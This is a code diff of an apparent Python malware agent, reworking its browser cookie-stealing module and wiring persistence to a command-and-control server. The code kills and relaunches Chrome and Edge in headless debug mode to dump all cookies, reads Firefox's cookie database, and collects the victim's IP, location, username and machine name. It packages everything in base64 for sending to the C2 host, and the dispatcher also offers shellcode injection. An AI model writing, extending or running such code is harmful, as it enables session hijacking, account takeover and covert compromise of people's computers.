@@ -37,7 +37,7 @@ import random, inspect, tempfile
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.147.1"
+        self.C2_SERVER = "https://192.168.16.78"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -124,148 +124,141 @@ class CookieStealer:
         self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
 
-        self.logger.debug("CookieStealer initialized with configurations:")
-        self.logger.debug(f"Chrome Path: {self.CHROME_PATH}")
-        self.logger.debug(f"Chrome User Data Dir: {self.CHROME_USER_DATA_DIR}")
-        self.logger.debug(f"Edge Path: {self.EDGE_PATH}")
-        self.logger.debug(f"Edge User Data Dir: {self.EDGE_USER_DATA_DIR}")
-        self.logger.debug(f"Firefox Profile Dir: {self.FIREFOX_PROFILE_DIR}")
-
     def steal_cookies(self):
         """Main method to steal cookies from all browsers"""
-        self.logger.info("Starting cookie stealing process")
         results = []
         
-        try:
-            # Chrome
-            self.logger.debug("Attempting to steal Chrome cookies")
-            chrome_data = self._process_browser_cookies(
-                'chrome',
-                self.CHROME_PATH,
-                self.chrome_debug_port,
-                self.CHROME_USER_DATA_DIR
-            )
-            if chrome_data:
-                results.append(chrome_data)
-                self.logger.info("Successfully stole Chrome cookies")
-            else:
-                self.logger.warning("Failed to steal Chrome cookies")
-            
-            # Edge
-            self.logger.debug("Attempting to steal Edge cookies")
-            edge_data = self._process_browser_cookies(
-                'edge',
-                self.EDGE_PATH,
-                self.edge_debug_port,
-                self.EDGE_USER_DATA_DIR
-            )
-            if edge_data:
-                results.append(edge_data)
-                self.logger.info("Successfully stole Edge cookies")
-            else:
-                self.logger.warning("Failed to steal Edge cookies")
-            
-            # Firefox
-            self.logger.debug("Attempting to steal Firefox cookies")
-            firefox_data = self._process_firefox_cookies()
-            if firefox_data:
-                results.append(firefox_data)
-                self.logger.info("Successfully stole Firefox cookies")
-            else:
-                self.logger.warning("Failed to steal Firefox cookies")
-            
-            self.logger.info(f"Cookie stealing completed. Retrieved from {len(results)} browsers")
-            return results
-            
-        except Exception as e:
-            self.logger.error(f"Critical error in steal_cookies: {str(e)}", exc_info=True)
-            return results
+        # Chrome
+        chrome_data = self._process_browser_cookies(
+            'chrome',
+            self.CHROME_PATH,
+            self.chrome_debug_port,
+            self.CHROME_USER_DATA_DIR
+        )
+        if chrome_data:
+            results.append(chrome_data)
+        
+        # Edge
+        edge_data = self._process_browser_cookies(
+            'edge',
+            self.EDGE_PATH,
+            self.edge_debug_port,
+            self.EDGE_USER_DATA_DIR
+        )
+        if edge_data:
+            results.append(edge_data)
+        
+        # Firefox
+        firefox_data = self._process_firefox_cookies()
+        if firefox_data:
+            results.append(firefox_data)
+        
+        return results
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
         """Process Chrome/Edge cookies"""
-        self.logger.debug(f"Starting {browser_name} cookie processing")
         try:
-            # Verify browser executable exists
-            if not os.path.exists(browser_path):
-                self.logger.error(f"{browser_name} not found at: {browser_path}")
-                return None
-
+            self._log('info', f"Processing {browser_name} cookies")
+            
             # Start browser in debug mode
-            self.logger.debug(f"Starting {browser_name} in debug mode on port {port}")
             proc = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
-                self.logger.error(f"Failed to start {browser_name} debug session")
                 return None
 
             # Wait for browser to start
-            self.logger.debug(f"Waiting for {browser_name} to initialize")
             time.sleep(5)
             
             # Get cookies via debug protocol
-            self.logger.debug(f"Attempting to retrieve {browser_name} cookies via debug protocol")
             cookies = self._get_cookies_via_debug(port)
             
-            if not cookies:
-                self.logger.warning(f"No cookies retrieved from {browser_name}")
-                return None
-
             # Clean up browser process
-            self.logger.debug(f"Terminating {browser_name} process")
             proc.terminate()
             proc.wait()
 
+            if not cookies:
+                return None
+
             # Transform cookies to standard format
-            self.logger.debug(f"Transforming {browser_name} cookies to standard format")
             transformed = self._transform_cookies(cookies)
             
             # Package cookies for transmission
-            self.logger.debug(f"Packaging {browser_name} cookies for transmission")
             return self._package_cookies(transformed, browser_name)
 
         except Exception as e:
-            self.logger.error(f"{browser_name} cookie processing failed: {str(e)}", exc_info=True)
+            self._log('error', f"{browser_name} cookie processing failed: {str(e)}")
             return None
 
     def _process_firefox_cookies(self):
         """Process Firefox cookies"""
-        self.logger.debug("Starting Firefox cookie processing")
         try:
+            self._log('info', "Processing Firefox cookies")
+            
             # Find Firefox profile
-            self.logger.debug("Searching for Firefox profile")
             profile_dir = self._find_firefox_profile()
             if not profile_dir:
-                self.logger.error("No Firefox profile found")
                 return None
 
-            self.logger.debug(f"Found Firefox profile at: {profile_dir}")
-
             # Extract cookies from SQLite database
-            self.logger.debug("Extracting cookies from Firefox SQLite database")
             cookies = self._extract_firefox_cookies(profile_dir)
             if not cookies:
-                self.logger.warning("No cookies found in Firefox database")
                 return None
 
             # Transform to standard format
-            self.logger.debug("Transforming Firefox cookies to standard format")
             transformed = self._transform_cookies(cookies)
             
             # Package for transmission
-            self.logger.debug("Packaging Firefox cookies for transmission")
             return self._package_cookies(transformed, 'firefox')
 
         except Exception as e:
-            self.logger.error(f"Firefox cookie processing failed: {str(e)}", exc_info=True)
+            self._log('error', f"Firefox cookie processing failed: {str(e)}")
             return None
 
-    def _start_browser_debug(self, browser_path, port, user_data_dir):
-        """Start browser in debug mode with detailed logging"""
-        self.logger.debug(f"Attempting to start browser: {browser_path}")
-        try:
-            # Kill existing browser processes
-            self.logger.debug(f"Killing existing {os.path.basename(browser_path)} processes")
-            self._kill_browser(os.path.basename(browser_path))
+    def _transform_cookies(self, cookies):
+        """Transform cookies into standard format with corrected sameSite values"""
+        transformed = []
+        for cookie in cookies:
+            if len(cookie) == 8:  # Firefox cookies
+                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
+            else:  # Chrome/Edge cookies
+                name = cookie['name']
+                value = cookie['value']
+                domain = cookie['domain']
+                path = cookie['path']
+                expiry = cookie.get('expires', 0)
+                is_secure = cookie.get('secure', False)
+                is_http_only = cookie.get('httpOnly', False)
+                same_site = cookie.get('sameSite', 'unspecified')
             
+            # Fix sameSite values to match allowed options
+            if same_site.lower() == 'none':
+                same_site = 'no_restriction'
+            elif same_site.lower() == 'lax':
+                same_site = 'lax'
+            elif same_site.lower() == 'strict':
+                same_site = 'strict'
+            else:
+                same_site = 'unspecified'  # default if not matching any known value
+            
+            transformed_cookie = {
+                "domain": domain,
+                "expirationDate": expiry,
+                "hostOnly": not domain.startswith('.'),
+                "httpOnly": bool(is_http_only),
+                "name": name,
+                "path": path,
+                "sameSite": same_site,
+                "secure": bool(is_secure),
+                "session": expiry == 0,
+                "storeId": "0",
+                "value": value
+            }
+            transformed.append(transformed_cookie)
+        return transformed
+
+    def _start_browser_debug(self, browser_path, port, user_data_dir):
+        """Start browser in debug mode"""
+        try:
+            self._kill_browser(os.path.basename(browser_path))
             command = [
                 browser_path,
                 f'--remote-debugging-port={port}',
@@ -273,136 +266,192 @@ class CookieStealer:
                 '--headless',
                 f'--user-data-dir={user_data_dir}'
             ]
-            self.logger.debug(f"Browser command: {' '.join(command)}")
-            
-            proc = subprocess.Popen(command, 
-                                  stdout=subprocess.PIPE,
-                                  stderr=subprocess.PIPE)
-            
-            # Log any startup errors
-            def log_stream(stream, stream_type):
-                for line in iter(stream.readline, b''):
-                    self.logger.debug(f"Browser {stream_type}: {line.decode().strip()}")
-            
-            threading.Thread(target=log_stream, args=(proc.stdout, 'stdout')).start()
-            threading.Thread(target=log_stream, args=(proc.stderr, 'stderr')).start()
-            
-            return proc
-            
+            return subprocess.Popen(command, 
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL)
         except Exception as e:
-            self.logger.error(f"Failed to start browser: {str(e)}", exc_info=True)
+            self._log('error', f"Failed to start browser: {str(e)}")
             return None
 
+    def _kill_browser(self, process_name):
+        """Kill browser process if running"""
+        try:
+            subprocess.run(f'taskkill /F /IM {process_name}', shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
     def _get_cookies_via_debug(self, port):
-        """Get cookies using Chrome DevTools Protocol with detailed logging"""
-        self.logger.debug(f"Attempting to connect to debug port {port}")
+        """Get cookies using Chrome DevTools Protocol"""
         try:
             debug_url = f'http://localhost:{port}/json'
-            self.logger.debug(f"Fetching debug targets from: {debug_url}")
-            
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
             
             data = response.json()
             if not data:
-                self.logger.warning("No debug targets found")
                 return []
                 
             ws_url = data[0]['webSocketDebuggerUrl']
-            self.logger.debug(f"Connecting to WebSocket: {ws_url}")
-            
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
             
-            self.logger.debug("Sending cookie request via WebSocket")
             ws.send(json.dumps({
                 'id': 1,
                 'method': 'Network.getAllCookies'
             }))
             
             response = json.loads(ws.recv())
-            self.logger.debug(f"Received {len(response['result']['cookies'])} cookies")
             return response['result']['cookies']
-            
-        except requests.exceptions.RequestException as e:
-            self.logger.error(f"HTTP request failed: {str(e)}")
-            return []
-        except websocket.WebSocketException as e:
-            self.logger.error(f"WebSocket error: {str(e)}")
-            return []
         except Exception as e:
-            self.logger.error(f"Unexpected debug protocol error: {str(e)}", exc_info=True)
+            self._log('error', f"Debug protocol error: {str(e)}")
             return []
         finally:
             if 'ws' in locals():
-                try:
-                    ws.close()
-                except:
-                    pass
+                ws.close()
+
+    def _find_firefox_profile(self):
+        """Find Firefox profile directory"""
+        try:
+            for profile in os.listdir(self.FIREFOX_PROFILE_DIR):
+                if profile.endswith('.default-release'):
+                    return os.path.join(self.FIREFOX_PROFILE_DIR, profile)
+            return None
+        except Exception as e:
+            self._log('error', f"Failed to find Firefox profile: {str(e)}")
+            return None
 
     def _extract_firefox_cookies(self, profile_dir):
-        """Extract cookies from Firefox SQLite database with detailed logging"""
-        self.logger.debug(f"Extracting cookies from Firefox profile: {profile_dir}")
+        """Extract cookies from Firefox SQLite database"""
         try:
             cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
             if not os.path.exists(cookies_db):
-                self.logger.error(f"Firefox cookies database not found at: {cookies_db}")
                 return []
                 
-            self.logger.debug(f"Opening SQLite database: {cookies_db}")
             conn = sqlite3.connect(cookies_db)
             cursor = conn.cursor()
             
-            cursor.execute("PRAGMA table_info(moz_cookies)")
-            columns = cursor.fetchall()
-            self.logger.debug(f"Firefox cookie table columns: {columns}")
-            
-            cursor.execute("SELECT COUNT(*) FROM moz_cookies")
-            count = cursor.fetchone()[0]
-            self.logger.debug(f"Found {count} cookies in database")
-            
+            # Modified query to ensure all fields are properly handled
             cursor.execute("""
                 SELECT 
-                    name, value, host, path, expiry, 
-                    isSecure, isHttpOnly, sameSite 
+                    CAST(name AS TEXT) as name,
+                    CAST(value AS TEXT) as value,
+                    CAST(host AS TEXT) as host,
+                    CAST(path AS TEXT) as path,
+                    CAST(expiry AS INTEGER) as expiry,
+                    CAST(isSecure AS INTEGER) as isSecure,
+                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
+                    CAST(sameSite AS INTEGER) as sameSite 
                 FROM moz_cookies
             """)
             
             cookies = []
             for row in cursor.fetchall():
                 try:
+                    # Ensure all values are properly converted
                     cookies.append((
-                        str(row[0]), str(row[1]), str(row[2]), str(row[3]),
-                        int(row[4]) if row[4] else 0,
-                        bool(row[5]), bool(row[6]),
-                        str(row[7]) if row[7] else 'none'
+                        str(row[0]),  # name
+                        str(row[1]),  # value
+                        str(row[2]),  # host
+                        str(row[3]),  # path
+                        int(row[4]) if row[4] else 0,  # expiry
+                        bool(row[5]),  # isSecure
+                        bool(row[6]),  # isHttpOnly
+                        str(row[7]) if row[7] else 'none'  # sameSite
                     ))
                 except Exception as e:
-                    self.logger.warning(f"Error processing cookie row: {str(e)}")
+                    self._log('error', f"Error processing Firefox cookie: {str(e)}")
                     continue
             
             conn.close()
-            self.logger.debug(f"Successfully extracted {len(cookies)} cookies")
             return cookies
-            
-        except sqlite3.Error as e:
-            self.logger.error(f"SQLite error: {str(e)}")
-            return []
         except Exception as e:
-            self.logger.error(f"Unexpected Firefox cookie extraction error: {str(e)}", exc_info=True)
+            self._log('error', f"Failed to extract Firefox cookies: {str(e)}")
             return []
-        
-    def _package_cookies(self, cookies, browser_name):
-        """Package cookies for transmission without zipping"""
-        self.logger.debug(f"Packaging {browser_name} cookies as JSON")
+
+    def _get_system_info(self):
+        """Get system information."""
         try:
+            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
             return {
-                "browser": browser_name,
-                "cookies": cookies,  # Send raw cookies as JSON
-                "system_info": SystemUtils.get_system_info()
+                'ip_address': ip_info.get('ip', 'Unknown'),
+                'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
+                'username': os.getenv('USERNAME'),
+                'computer_name': os.getenv('COMPUTERNAME'),
+                'windows_version': platform.version(),
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
             }
         except Exception as e:
-            self.logger.error(f"Failed to package {browser_name} cookies: {str(e)}")
+            return {
+                'ip_address': 'Unknown',
+                'location': 'Unknown',
+                'username': 'Unknown',
+                'computer_name': 'Unknown',
+                'windows_version': 'Unknown',
+                'user_agent': 'Unknown'
+            }
+
+    def _extract_unique_domains(self, cookies):
+        """Extract unique domains from cookies."""
+        unique_domains = set()
+        for cookie in cookies:
+            domain = cookie.get('domain', '')
+            if domain:
+                unique_domains.add(domain)
+        return list(unique_domains)
+
+    def _package_cookies(self, cookies, browser_name):
+        """Package cookies into base64 encoded JSON with system info"""
+        try:
+            if not cookies:
+                return None
+                
+            # Extract unique domains
+            unique_domains = self._extract_unique_domains(cookies)
+            self.unique_domains.update(unique_domains)
+            
+            # Get system info
+            system_info = self._get_system_info()
+            
+            # Create temporary file
+            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+            os.makedirs(temp_dir, exist_ok=True)
+            
+            temp_file = os.path.join(temp_dir, f'{browser_name}_cookies.json')
+            with open(temp_file, 'w') as f:
+                json.dump(cookies, f, indent=4)
+            
+            # Read file content
+            with open(temp_file, 'rb') as f:
+                cookie_data = f.read()
+            
+            # Clean up
+            os.remove(temp_file)
+            
+            return {
+                'browser': browser_name,
+                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
+                'system_info': {
+                    **system_info,
+                    'unique_domains': unique_domains,
+                    'all_domains': list(self.unique_domains)
+                }
+            }
+        except Exception as e:
+            self._log('error', f"Failed to package {browser_name} cookies: {str(e)}")
             return None
+
+    def _create_default_logger(self):
+        logger = logging.getLogger('CookieStealer')
+        if not logger.handlers:
+            handler = logging.StreamHandler()
+            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+            logger.addHandler(handler)
+            logger.setLevel(logging.INFO)
+        return logger
+
+    def _log(self, level, message):
+        if self.logger:
+            getattr(self.logger, level)(message)
 
 # ======================
 # System Functions
@@ -1412,7 +1461,7 @@ class Agent:
             
             elif task_type == "persist":
                 self._log_info("Installing persistence")
-                return Persistence.install()
+                return Persistence.install(self.config.C2_SERVER)
             
             elif task_type == "inject":
                 return ProcessInjector.inject_shellcode(
